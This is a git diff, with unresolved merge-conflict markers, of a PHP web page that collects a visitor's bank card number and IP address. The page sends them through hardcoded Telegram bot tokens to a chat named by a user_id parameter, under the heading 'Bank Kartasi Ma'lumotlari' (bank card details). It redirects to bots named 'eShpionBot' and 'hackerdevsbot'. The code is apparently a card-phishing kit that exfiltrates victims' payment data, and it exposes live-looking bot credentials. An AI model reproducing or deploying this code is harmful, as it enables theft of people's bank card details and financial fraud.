@@ -12,7 +12,11 @@ if (count($parts) >= 2) {
 }
 
 if(empty($user_id) || !is_numeric($user_id)) {
+<<<<<<< HEAD
     header("Location: https://t.me/eShpionBot?start=true");
+=======
+    header("Location: https://t.me/hackerdevsbot?start=true");
+>>>>>>> 986a4aa54d157ecbc5d11f09786731e3683fb311
     exit;
 }
 
@@ -25,7 +29,11 @@ if($_SERVER['REQUEST_METHOD'] === 'POST') {
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
     
     if(!empty($card_number)) {
+<<<<<<< HEAD
         $bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
+=======
+        $bot_token = "8592685877:AAFHxj5UaKAXxpMz5qNzdrBQ9k1Ucn-MDRE";
+>>>>>>> 986a4aa54d157ecbc5d11f09786731e3683fb311
         $chat_id = $user_id;
         
         $message = "💳 <b>Bank Kartasi Ma'lumotlari</b>\n\n";
@@ -172,4 +180,8 @@ if($_SERVER['REQUEST_METHOD'] === 'POST') {
         }, 2000);
     </script>
 </body>
+<<<<<<< HEAD
 </html>
+=======
+</html>
+>>>>>>> 986a4aa54d157ecbc5d11f09786731e3683fb311
